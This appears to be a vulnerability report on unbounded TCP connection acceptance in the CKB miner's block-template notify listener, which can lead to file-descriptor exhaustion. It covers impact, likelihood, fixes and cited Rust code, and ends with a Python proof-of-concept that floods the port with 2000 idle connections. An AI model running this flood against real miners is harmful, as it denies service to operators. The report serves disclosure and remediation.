### Title
Unbounded TCP Connection Acceptance in `listen_block_template_notify` Causes File-Descriptor Exhaustion — (`miner/src/client.rs`)

---

### Summary

`listen_block_template_notify` accepts every inbound TCP connection unconditionally, spawning an unbounded number of tokio tasks each holding an open file descriptor. There is no per-IP limit, no total connection cap, and no idle-connection timeout. An attacker who can reach the notify port can exhaust the process FD table, causing all subsequent `accept()` calls to fail and permanently preventing the miner from receiving block-template notifications.

---

### Finding Description

In `listen_block_template_notify`, every successful `accept()` immediately spawns a new task: [1](#0-0) 

There is no guard before or after `tokio::spawn`:
- No counter of open connections.
- No per-source-IP rate limit.
- No idle/read timeout on the accepted stream before the HTTP request arrives.
- No maximum-connections check.

Each accepted TCP socket consumes one OS file descriptor for the lifetime of the hyper connection. A client that connects and sends nothing keeps the FD open indefinitely because hyper waits for the HTTP request to complete.

When the process FD table fills (default `ulimit -n` is 1024 on many Linux distributions), `accept()` returns `EMFILE`. The error handler logs the error and sleeps one second: [2](#0-1) 

During that sleep — and for as long as the attacker holds the flood connections open — no new connection can be accepted, so legitimate block-template pushes from the CKB node are silently dropped.

The `listen` field is `Option<SocketAddr>` with no enforcement of a loopback-only address: [3](#0-2) 

The template config comments out the feature but explicitly documents binding to `127.0.0.1:8888`: [4](#0-3) 

Operators who run the miner on a separate host from the CKB node must bind to a non-loopback address, directly exposing the port to the network.

---

### Impact Explanation

- The miner process exhausts its FD table.
- `accept()` fails continuously; the 1-second sleep loop cannot recover while the flood is maintained.
- The CKB node's HTTP POST notifications to the miner are refused at the TCP level.
- The miner stops receiving new block templates and stops producing blocks for the duration of the attack.
- Block submission still works (it uses an outbound RPC connection, not the notify listener), but without fresh templates the miner works on stale data and any found solution is rejected by the node.

---

### Likelihood Explanation

- The notify feature is opt-in and disabled by default, which limits the exposed population to miners who have explicitly enabled it.
- Any operator running the miner on a machine separate from the CKB node must bind to a non-loopback address, making the port network-reachable.
- The attack requires only the ability to open TCP connections — no authentication, no valid HTTP, no protocol knowledge.
- Maintaining ~1 000 idle TCP connections is trivial with standard tooling (`hping3`, a short Python script, etc.).
- The attack is fully reversible by the attacker (drop connections → miner recovers), making it a reliable on/off denial-of-service.

---

### Recommendation

1. **Enforce a maximum concurrent connection count.** Maintain an `Arc<AtomicUsize>` connection counter; reject (immediately close) connections that exceed a configurable ceiling (e.g., 64).
2. **Add a per-connection read timeout.** Use `tokio::time::timeout` around the hyper serve call so idle connections are evicted after a few seconds, freeing FDs automatically.
3. **Optionally restrict the bind address** to loopback in the default configuration and document that non-loopback binding requires firewall protection.

---

### Proof of Concept

```python
import socket, time

TARGET = ("192.0.2.1", 8888)   # miner notify address
sockets = []

# Open 2000 idle TCP connections, send nothing
for _ in range(2000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(TARGET)
    sockets.append(s)

# Now attempt a legitimate block-template notification
import urllib.request, json
try:
    data = json.dumps({"work_id": "0x1", ...}).encode()
    urllib.request.urlopen(
        urllib.request.Request(f"http://{TARGET[0]}:{TARGET[1]}/",
                               data=data,
                               headers={"Content-Type": "application/json"}),
        timeout=5
    )
    print("FAIL: notification accepted (unexpected)")
except Exception as e:
    print(f"PASS: notification rejected — {e}")
    # miner is now deaf to block-template pushes

# Release flood
for s in sockets:
    s.close()
```

Expected result: the legitimate notification fails with a connection-refused or timeout error while the flood is active, confirming FD exhaustion. After releasing the flood connections the miner recovers, confirming the root cause is the unbounded FD consumption in `listen_block_template_notify`.

### Citations

**File:** miner/src/client.rs (L244-261)
```rust
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
```

**File:** util/app-config/src/configs/miner.rs (L28-30)
```rust
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
}
```

**File:** resource/ckb-miner.toml (L59-60)
```text
# enable listen notify mode
# listen = "127.0.0.1:8888"
```
